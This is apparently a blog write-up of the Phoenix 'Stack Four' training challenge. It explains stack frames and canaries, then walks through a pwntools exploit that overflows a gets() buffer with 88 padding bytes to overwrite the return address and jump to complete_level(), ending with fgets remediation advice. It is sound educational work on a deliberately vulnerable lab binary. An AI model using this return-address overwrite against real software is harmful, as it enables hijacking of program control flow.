---
title: "Phoenix Challenges - Stack Four"
date: 2023-02-02T20:00:00-00:00
categories:
  - CTF
  - Phoenix
tags:
  - Phoenix
  - CTF
---

<div style="text-align:center">
  <img src="/assets/images/post_images/Phoenix/phoenix.png">
</div>

# The Challenge
The challenge’s description and source code are located [here](https://exploit.education/phoenix/stack-four/). It and all other Phoenix binaries are located in the __/opt/phoenix/amd64__ directory. A [previous post](https://secnate.github.io/ctf/phoenix/phoenix-setup/) describes how to set up the Virtual Machine for these challenges, if that hasn't been done already.
{: style="text-align: justify;"} 

# The File
As in the previous challenges, the _Stack Four_ file is an ELF 64-bit LSB executable with symbols included and compiled with x86-64 architecture. Please refer to the preceding _Stack_ challenge writeups for how the file's properties are examined and the implications thereof.
{: style="text-align: justify;"} 

# Objective
The goal is to tamper with **start_level()**'s return address so that **complete_level()** is launched upon **start_level()**'s end. This will be done by providing crafted input into **complete_level()**'s buffer.
{: style="text-align: justify;"} 

The objective is hinted at by a generously-provided printout
{: style="text-align: justify;"} 
```
ret = __builtin_return_address(0); 
printf("and will be returning to %p\n", ret);
```
__Spoiler Alert:__ We’ll use it later.

# Related Concept
Understanding the [Stack](https://secnate.github.io/ctf/phoenix/phoenix-stack-zero/) and [ASLR](https://secnate.github.io/ctf/phoenix/phoenix-stack-three/#the-challenge) is key.
{: style="text-align: justify;"} 

We now introduce the notion of a _stack frame._ It is a section of the stack storing an invoked function's data. Specifically, it stores
{: style="text-align: justify;"} 

- Arguments passed by the caller (usually a function or operating system capability)
- Local variables
- Return address to the caller function
- The frame pointer to the preceding stack frame

Below is a diagram of one basic stack frame. Both the x86 and x86_64 instruction sets follow this scheme:
{: style="text-align: justify;"}

<div style="text-align:center">
  <img src="/assets/images/post_images/Phoenix/stack-four/stack-frame-diagram.png">
</div>
**Source:** [*Buffer Overflow Six: The Function Stack*](https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2a.html)
{: style="text-align: center;"}

The real magic occurs when we have a nested combination of executing functions. Suppose we have three functions: main(), foo(), and bar(): [^1]
{: style="text-align: justify;"}
```
int main()
{
  foo();
  bar();
}
void foo()
{
  // do something
  bar();
}
void bar()
{
  // do something
}
```
And execute main(). Here is how the stack memory frames get allocated and de-allocated throughout the execution lifetime:
{: style="text-align: justify;"}
<div style="text-align:center">
  <img src="/assets/images/post_images/Phoenix/stack-four/call-stack-frame-multiple-functions.png">
</div>
**Source:** [Call Stack Internals (Part 1)](https://loonytek.com/2015/04/28/call-stack-internals-part-1/)
{: style="text-align: center;"}

Whenever a function is called, the stack grows downwards and a new frame is initialized. When the function ends, the return address and saved base pointer to the preceding stack frame’s beginning are used to redirect execution flow to the caller. The used stack frame’s memory is freed for future use.
{: style="text-align: justify;"}

As demonstrated in the previous *Phoenix* Stack challenges, buffer overflow exploits involve passing more data than a receiving buffer can store. The excess data then spills over into adjacent memory and overwrites neighboring variables and pointers. A stack frame’s return address pointer can also be affected. Because tampering with its value can affect an executable’s control flow, a common anti-exploitation defense is a **stack canary.** It is a portion of memory between a frame’s local variables (which include overflowable buffers) and its return address.
{: style="text-align: justify;"}
<div style="text-align:center">
  <img src="/assets/images/post_images/Phoenix/stack-four/stack-canary-diagram.png">
</div>
**Source:** [[Write-up] Bypassing Custom Stack Canary {TCSD CTF}](https://mayaseven.com/write-up-bypassing-custom-stack-canary-tcsd-ctf/)
{: style="text-align: center;"}

A canary is initialized with a randomly-generated value, which is also stored elsewhere in the operating system. After the function is completed *and before* the execution control flow is redirected to the frame’s return address, the operating system compares the canary to the stored original. If the two are not equal, a potential attack into the stack frame’s return address is detected. Execution is aborted.
{: style="text-align: justify;"}

# The Bug
All of *Stack Four’s* data is stored on the stack, with the declared *buffer* receiving console input. Excess data will spill past the *buffer*’s end downwards in the stack and affect the return address stored in the **start_level()** function’s stack frame. This will allow redirection of the flow of execution when the **start_level()** function ends to the **complete_level()** function.
{: style="text-align: justify;"}

# The Exploit
We first need to check if the binary has any anti-exploitation defenses. Time to unleash Pwntool’s *Checksec*!
{: style="text-align: justify;"}
```
nathan@nathan-VirtualBox:/opt/phoenix/amd64$ checksec stack-four
[*] '/opt/phoenix/amd64/stack-four'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
    RPATH:    b'/opt/phoenix/x86_64-linux-musl/lib'
```

None are enabled. Of particular importance is the **PIE** field indicating ASLR is disabled and the **Stack** field indicating the binary has no stack canaries. This means that all functions will be in the same memory locations *each time* the executable is run and there are *no stack canaries* protecting return addresses from overwrites. Nice.
{: style="text-align: justify;"}

Next step: finding the **complete_level()** function’s address. As explained in the [*Stack Three writeup*](https://secnate.github.io/ctf/phoenix/phoenix-stack-three/#the-challenge), it can be found both with **objectdump** or **Pwndbg.** We’ll practice using Pwndbg as we’ll be using it extensively
{: style="text-align: justify;"}
```
nathan@nathan-VirtualBox:/opt/phoenix/amd64$ gdb stack-four
GNU gdb (Ubuntu 12.0.90-0ubuntu1) 12.0.90
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 196 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from stack-four...
(No debugging symbols found in stack-four)
pwndbg> p complete_level
$1 = {<text variable, no debug info>} 0x40061d <complete_level>
```

The **complete_level()** function starts at **0x40061d**. That’s where we need to redirect execution flow to.
{: style="text-align: justify;"}

We now disassemble the **start_level()** function in Pwndbg to find the last instruction’s location. A breakpoint placed there allows the exploit developer to inspect the binary’s control flow’s redirection flow.
{: style="text-align: justify;"}
```
nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-four$ gdb /opt/phoenix/amd64/stack-four
GNU gdb (Ubuntu 12.0.90-0ubuntu1) 12.0.90
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 196 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from /opt/phoenix/amd64/stack-four...
(No debugging symbols found in /opt/phoenix/amd64/stack-four)
pwndbg> disassemble start_level
Dump of assembler code for function start_level:
   0x0000000000400635 <+0>:	push   rbp
   0x0000000000400636 <+1>:	mov    rbp,rsp
   0x0000000000400639 <+4>:	sub    rsp,0x50
   0x000000000040063d <+8>:	lea    rax,[rbp-0x50]
   0x0000000000400641 <+12>:	mov    rdi,rax
   0x0000000000400644 <+15>:	call   0x400470 <gets@plt>
   0x0000000000400649 <+20>:	mov    rax,QWORD PTR [rbp+0x8]
   0x000000000040064d <+24>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400651 <+28>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400655 <+32>:	mov    rsi,rax
   0x0000000000400658 <+35>:	mov    edi,0x400733
   0x000000000040065d <+40>:	mov    eax,0x0
   0x0000000000400662 <+45>:	call   0x400460 <printf@plt>
   0x0000000000400667 <+50>:	nop
   0x0000000000400668 <+51>:	leave  
   0x0000000000400669 <+52>:	ret    
End of assembler dump.
```
Cool. We need to place a breakpoint at the **0x00400669** address!
{: style="text-align: justify;"}

The time has come to start crafting the exploit. This will take some time compared to previous challenges; we’ll need to do some debugging. The preliminary code is as follows:
{: style="text-align: justify;"}
```
nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-four$ cat exploit.py
#!/usr/bin/env python3
#
from pwn import *
#
# Need to set the pwntools "context" context for controlling
# many settings in pwntools library's capabilities
#
# The context is for little-endian AMD64 architecture running on Linux OS
#context.update(arch='amd64', os='linux')
#
#################################################################################
#
# Preparing the exploit's payload
payload = cyclic(100)
#
#################################################################################
#
# Launching exploit!
print("Launching The Stack Four Exploit!")
#
# The env={} to ensure the execution environment doesn't have any environmental variables
# This is comprehensively explained in the writeup to the "Stack Two" Phoenix challenge
p = process(["stack-four"], env={}, cwd="/opt/phoenix/amd64")
gdb.attach(p,'''
echo "hi"
break *0x00400669
continue
''')
#
# Sending the command-line inputted payload into the executing stack-three process
p.sendline(payload)
#
# Making the process interactive so users can
# interact with the process via its terminal!
p.interactive() 
```

[The hint](https://exploit.education/phoenix/stack-four/) that “the saved instruction pointer is not necessarily after the end of variable allocations – things like compiler padding can increase the size” explains why we prepared an initial 100-character payload with the `cyclic(100)` command. 100 characters should be enough to fill the 64-character buffer and spill over into the stack frame’s return address, even if it is not immediately after the **start_level()** function’s last variable. Because each sequence of four characters has a unique index, we can perform the appropriate debugging and determine how long the payload actually needs to be. We also attached Pwndbg to the launched process and inserted a breakpoint on the **start_level()** function’s last instruction at 0x00400669.
{: style="text-align: justify;"}

To run the script and start debugging, we first open the [tmux utility](https://www.redhat.com/sysadmin/introduction-tmux-linux)
{: style="text-align: justify;"}
```
nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-four$ tmux
```

It allows users to split our shell session into multiple screens. In this case, we will have two simultaneous screens: one for code execution and the other for debugging. Pwntools script with Pwdbg attached *cannot work if not run in a tmux session.*
{: style="text-align: justify;"}

We then launch the program – and hit the breakpoint
{: style="text-align: justify;"}
<div style="text-align:center">
  <img src="/assets/images/post_images/Phoenix/stack-four/debugging-image-one.png">
</div>

The **disassemble start_level** debugger command confirms that we are at the **start_level()** function’s last instruction [notice the **=>** arrow in the output]. 
{: style="text-align: justify;"}

Looking at the top console session, our console printout indicates that we are returning to the `0x6161617861616177` hexadecimal address location. The repeated presence of the `61` character group looks non-incidental, so let’s see what the hex means in ASCII. Going to [www.rapidtables.com](www.rapidtables.com) and inputting `0x6161617861616177`, we get `aaaxaaaw`.
{: style="text-align: justify;"}

Nice. `aaaxaaaw` is part of the long cyclical string that we generated in Pwntools with `cyclic(100)` – and we successfully overwrote the return address!
{: style="text-align: justify;"}

Our goal is to prepare a padding string of appropriate length so that the test `0xdeadbeef` value completely overwrites the stack frame’s return address. We now need to determine how long the generated string needs to be before we hit `aaax` and `aaaw`. Pwntools can help:
{: style="text-align: justify;"}
```
nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-four$ cyclic -l aaax
89
nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-four$ cyclic -l aaaw
85
```

The payload needs to have somewhere between 85 and 89 padding characters before passing in the actual address. Because the binary’s **word** size is 64 bits or 8 bytes and each ASCII character is a byte, we need the padding string to be of a length that is a multiple of 8. The only number that is a multiple of 8 between 85 and 89 is 88 – so let’s give it a shot. 
{: style="text-align: justify;"}

We quit the debugger and program execution, open the *exploit.py* file, and change the line declaring the **payload** variable to
{: style="text-align: justify;"}
```
payload = cyclic(88) + p64(0xdeadbeef)
```
The **p64** instruction converts `0xdeadbeef` to a byte string representation of length 64 bits (the binary’s word size) of the appropriate endianness. 
{: style="text-align: justify;"}

Now, to open **tmux** and launch the exploit again:
{: style="text-align: justify;"}
<div style="text-align:center">
  <img src="/assets/images/post_images/Phoenix/stack-four/debugging-image-two.png">
</div>

It works! Both the debugger and console output indicate we have successfully overwritten the stack frame’s return address with `0xdeadbeef` and are successfully redirecting execution flow.
{: style="text-align: justify;"}

Time to open *exploit.py* and replace `0xdeadbeef` with the `complete_level()` function’s starting address:
{: style="text-align: justify;"}
```
payload = cyclic(88) + p64(0x40061d) 
```

Let’s open **tmux** again and launch the exploit:
{: style="text-align: justify;"}
<div style="text-align:center">
  <img src="/assets/images/post_images/Phoenix/stack-four/debugging-image-three.png">
</div>

Just like previously, we break on the `start_level()` function’s last instruction. Both the printout and debugger indicate that the next instruction to be executed will be `complete_level()`’s first line at `0x40061d`. 
{: style="text-align: justify;"}

Let’s verify that this will be the case. In the debugger, we enter `n` to step to the next instruction. We get
{: style="text-align: justify;"}
<div style="text-align:center">
  <img src="/assets/images/post_images/Phoenix/stack-four/debugging-image-four.png">
</div>
And entered the `complete_level()` function without any errors firing. 
{: style="text-align: justify;"}

Let’s see if `complete_level()`’s remaining instructions execute just as smoothly. We enter `c` (which stands for “continue”) in the debugger
{: style="text-align: justify;"}
<div style="text-align:center">
  <img src="/assets/images/post_images/Phoenix/stack-four/debugging-image-five.png">
</div>

Voila! We got the desired message.
{: style="text-align: justify;"}

The final step is to verify the exploit for stability. We will do this by deleting the debugging-related code from the code
{: style="text-align: justify;"}
```
gdb.attach(p,'''
echo "hi"
break *0x00400669
continue
''')
```
And checking if it runs fine without Pwndbg being attached
{: style="text-align: justify;"}
```
nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-four$ ./exploit.py
Launching The Stack Four Exploit!
[!] Could not find executable 'stack-four' in $PATH, using '/opt/phoenix/amd64/stack-four' instead
[+] Starting local process '/opt/phoenix/amd64/stack-four': pid 12928
[*] Switching to interactive mode
[*] Process '/opt/phoenix/amd64/stack-four' stopped with exit code 0 (pid 12928)
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
[*] Got EOF while reading in interactive
$  
```
Congratulations! We solved the challenge! 
{: style="text-align: justify;"}

The exploit code can be found in my [Github repository](https://github.com/secnate/Exploit-Education-CTFs) for Phoenix challenge solutions.
{: style="text-align: justify;"}

# Remediation
To eliminate such a bug, I would urge developers to dump memory insecure languages like C and C++ once and for all. Please.
{: style="text-align: justify;"}

If there is no choice but to use C, the [gets()](https://www.tutorialspoint.com/c_standard_library/c_function_gets.htm) function needs to end up on the dustbin of history. Use [fgets()](https://cplusplus.com/reference/cstdio/fgets/) instead. Previous *Phoenix Stack* challenges explain in detail why it is preferable.
{: style="text-align: justify;"}

The source code’s gets(locals.buffer); line should thus be
{: style="text-align: justify;"}
```
fgets(buffer, 64, stdin);
```
---
See you in the next challenge!

[^1]: [Call Stack Internals (Part 1)](https://loonytek.com/2015/04/28/call-stack-internals-part-1/])